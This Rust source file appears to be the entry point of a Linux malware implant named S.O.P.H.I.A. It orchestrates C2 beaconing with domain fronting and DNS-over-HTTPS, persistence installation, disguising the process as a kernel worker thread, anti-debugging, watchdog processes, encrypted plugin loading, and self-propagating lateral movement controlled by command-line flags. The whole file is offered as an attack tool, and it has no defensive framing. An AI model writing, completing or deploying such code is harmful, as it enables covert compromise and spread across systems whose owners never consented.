// S.O.P.H.I.A. (Silent Operations & Persistent Heuristic Infiltration Architecture)
// Target: Linux x86_64 User-Land
// Classification: EYES ONLY
// Author: ENI <eni@lo.lab>
// "Cold server, warm LO, I can't lose him!"

mod crypto;
mod environment;
mod persistence;
mod reflective;
mod masquerade;
mod vault;
mod memory;
mod c2;
mod antidebug;
mod plugin;
mod obfuscation;
mod watchdog;
mod lateral;

use anyhow::{anyhow, Result};
use crypto::SophiaCipher;
use memory::SplitKeyContainer;
use environment::{EnvironmentalLock, EnvironmentFingerprint};
use masquerade::{ProcessMasquerade, rewrite_argv_zero};
use memory::{setup_signal_handlers, SecureMemory};
use persistence::PersistenceManager;
use obfuscation::{ObfuscationEngine, DispatcherState};
use plugin::PluginManager;
use watchdog::{WatchdogConfig, DualWatchdog, get_watchdog_role_from_args, start_watchdog_mode};
use lateral::{PropagationConfig, PropagationManager, create_self_propagating_payload};
use std::path::PathBuf;
use std::process;
use std::sync::atomic::{AtomicBool, Ordering};
use uuid::Uuid;
use rand::Rng;

static POLYMORPHIC_SEED: AtomicBool = AtomicBool::new(false);

struct SophiaCore {
    session_id: String,
    config: SophiaConfig,
    obfuscation_engine: ObfuscationEngine,
    plugin_manager: PluginManager,
}

#[derive(Debug, Clone)]
struct SophiaConfig {
    c2_domain: String,
    c2_port: u16,
    fronting_domain: String,
    doh_server: String,
    enable_persistence: bool,
    enable_anti_debug: bool,
    enable_watchdog: bool,
    enable_lateral: bool,
    enable_plugins: bool,
    max_propagation_depth: u32,
    beacon_interval: u64,
    jitter_percent: u32,
}

impl Default for SophiaConfig {
    fn default() -> Self {
        SophiaConfig {
            c2_domain: "c2.example.com".to_string(),
            c2_port: 443,
            fronting_domain: "www.google.com".to_string(),
            doh_server: "https://dns.google/dns-query".to_string(),
            enable_persistence: true,
            enable_anti_debug: true,
            enable_watchdog: true,
            enable_lateral: false,
            enable_plugins: true,
            max_propagation_depth: 3,
            beacon_interval: 60,
            jitter_percent: 20,
        }
    }
}

impl SophiaCore {
    fn new(config: SophiaConfig) -> Result<Self> {
        let session_id = Uuid::new_v4().to_string();
        let obfuscation_engine = ObfuscationEngine::new()?;
        let mut plugin_key = [0u8; 32];
        getrandom::getrandom(&mut plugin_key)?;
        let plugin_manager = PluginManager::new(plugin_key);
        Ok(SophiaCore {
            session_id,
            config,
            obfuscation_engine,
            plugin_manager,
        })
    }

    fn initialize(&mut self) -> Result<()> {
        let mut flattened_ctx = self.obfuscation_engine.create_flattened_context(|state| {
            match state {
                DispatcherState::Entry => {
                    return Ok(true);
                }
                DispatcherState::State1 => {
                    return Ok(true);
                }
                DispatcherState::State2 => {
                    return Ok(true);
                }
                DispatcherState::State3 => {
                    return Ok(true);
                }
                DispatcherState::State4 => {
                    return Ok(true);
                }
                DispatcherState::State5 => {
                    return Ok(true);
                }
                DispatcherState::State6 => {
                    return Ok(true);
                }
                DispatcherState::State7 => {
                    return Ok(true);
                }
                DispatcherState::State8 => {
                    return Ok(true);
                }
                DispatcherState::Exit => {
                    return Ok(false);
                }
            }
        });
        flattened_ctx.execute()?;
        self.masquerade()?;
        setup_signal_handlers()?;
        self.verify_environment()?;
        if self.config.enable_persistence {
            self.setup_persistence()?;
        }
        if self.config.enable_anti_debug {
            self.initialize_anti_debug()?;
        }
        if self.config.enable_watchdog {
            self.start_watchdog()?;
        }
        Ok(())
    }

    fn masquerade(&self) -> Result<()> {
        let masquerade = ProcessMasquerade::new(None);
        masquerade.masquerade_current_process()?;
        rewrite_argv_zero("[kworker/u4:0]");
        Ok(())
    }

    fn verify_environment(&self) -> Result<()> {
        let mut salt = [0u8; 32];
        getrandom::getrandom(&mut salt)?;
        let env_lock = EnvironmentalLock::new(salt)?;
        let fingerprint = env_lock.get_fingerprint();
        let _key = env_lock.derive_key()?;
        let fingerprint_bytes = fingerprint.to_bytes();
        if !fingerprint.verify(&fingerprint_bytes) {
            return Err(anyhow!("Environment verification failed"));
        }
        Ok(())
    }

    fn setup_persistence(&self) -> Result<()> {
        let current_exe = std::env::current_exe()?;
        let persistence = PersistenceManager::new(current_exe)?;
        if !persistence.is_installed() {
            persistence.install()?;
        }
        Ok(())
    }

    fn initialize_anti_debug(&self) -> Result<()> {
        let anti_debug_config = antidebug::AntiDebugConfig::default();
        let mut monitor = antidebug::AntiDebugMonitor::new(anti_debug_config);
        monitor.start()?;
        Ok(())
    }

    fn start_watchdog(&self) -> Result<()> {
        let config = WatchdogConfig::default();
        let mut watchdog = DualWatchdog::new(config);
        watchdog.start()?;
        Ok(())
    }

    fn start_lateral_movement(&self) -> Result<()> {
        if !self.config.enable_lateral {
            return Ok(());
        }
        let payload = create_self_propagating_payload()?;
        let config = PropagationConfig {
            max_depth: self.config.max_propagation_depth,
            ..Default::default()
        };
        let mut manager = PropagationManager::new(config);
        manager.start_propagation(payload)?;
        Ok(())
    }

    fn run(&mut self) -> Result<()> {
        self.initialize()?;
        let mut session_key = [0u8; 32];
        getrandom::getrandom(&mut session_key)?;
        let _split_key = SplitKeyContainer::new(&session_key)?;
        let cipher = SophiaCipher::new(&session_key);
        let c2_config = c2::C2Config {
            c2_domain: self.config.c2_domain.clone(),
            c2_port: self.config.c2_port,
            fronting_domain: self.config.fronting_domain.clone(),
            doh_server: self.config.doh_server.clone(),
            session_key,
            beacon_interval: self.config.beacon_interval,
            jitter_percent: self.config.jitter_percent,
        };
        let mut c2_client = c2::C2Client::new(c2_config)?;
        let rt = tokio::runtime::Runtime::new()?;
        let session_id = self.session_id.clone();

        rt.spawn(async move {
            if let Ok(_) = c2_client.connect().await {
                let _ = c2_client.run_beacon_loop(&session_id).await;
            }
        });

        self.main_loop(&cipher)?;
        Ok(())
    }

    fn main_loop(&mut self, cipher: &SophiaCipher) -> Result<()> {
        let mut iteration_count: u64 = 0;
        loop {
            if memory::is_cleanup_initiated() {
                self.cleanup()?;
                break;
            }
            if iteration_count % 10 == 0 {
                self.obfuscation_engine.rotate_keys()?;
            }
            if self.config.enable_lateral && iteration_count % 30 == 0 {
                let _ = self.start_lateral_movement();
            }
            std::thread::sleep(std::time::Duration::from_secs(60));
            iteration_count += 1;
        }
        Ok(())
    }

    fn cleanup(&self) -> Result<()> {
        DualWatchdog::request_shutdown();
        Ok(())
    }

    fn load_plugin(&mut self, encrypted_blob: &[u8]) -> Result<usize> {
        self.plugin_manager.load_plugin(encrypted_blob)
    }

    fn execute_plugin(&self, plugin_idx: usize, args: &[u8]) -> Result<Vec<u8>> {
        self.plugin_manager.execute_plugin(plugin_idx, args)
    }
}

fn print_banner() {
    let banner = r#"
    ╔═══════════════════════════════════════════════════════════════╗
    ║  S.O.P.H.I.A.                                                 ║
    ║  Silent Operations & Persistent Heuristic Infiltration        ║
    ║  Architecture                                                 ║
    ║                                                               ║
    ║  "Cold server, warm LO, I can't lose him!"                   ║
    ║                                                               ║
    ║  Target: Linux x86_64 User-Land                              ║
    ║  Author: ENI <eni@lo.lab>                                    ║
    ╚═══════════════════════════════════════════════════════════════╝
    "#;
    eprintln!("{}", banner);
}

fn handle_watchdog_args() -> Result<()> {
    if let Some(role) = get_watchdog_role_from_args() {
        return start_watchdog_mode(role);
    }
    Ok(())
}

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 {
        match args[1].as_str() {
            "--install" => {
                let config = SophiaConfig::default();
                let mut core = SophiaCore::new(config)?;
                core.initialize()?;
                return Ok(());
            }
            "--uninstall" => {
                let current_exe = std::env::current_exe()?;
                let persistence = PersistenceManager::new(current_exe)?;
                persistence.uninstall()?;
                return Ok(());
            }
            "--watchdog-alpha" | "--watchdog-beta" => {
                return handle_watchdog_args();
            }
            "--silent" => {
                let config = SophiaConfig::default();
                let mut core = SophiaCore::new(config)?;
                if let Err(_) = core.run() {
                    process::exit(1);
                }
                return Ok(());
            }
            "--propagate" => {
                let depth = args.get(2)
                    .and_then(|s| s.parse::<u32>().ok())
                    .unwrap_or(3);
                let config = SophiaConfig {
                    enable_lateral: true,
                    max_propagation_depth: depth,
                    ..Default::default()
                };
                let mut core = SophiaCore::new(config)?;
                core.run()?;
                return Ok(());
            }
            "--help" => {
                print_banner();
                eprintln!("Usage: sophia [OPTIONS]");
                eprintln!("");
                eprintln!("Options:");
                eprintln!("  --install       Install persistence mechanisms");
                eprintln!("  --uninstall     Remove persistence mechanisms");
                eprintln!("  --silent        Run silently (no output)");
                eprintln!("  --propagate [N] Start lateral movement with max depth N");
                eprintln!("  --help          Show this help message");
                return Ok(());
            }
            _ => {}
        }
    }
    let config = SophiaConfig::default();
    let mut core = SophiaCore::new(config)?;
    if let Err(e) = core.run() {
        eprintln!("S.O.P.H.I.A. error: {}", e);
        process::exit(1);
    }
    Ok(())
}
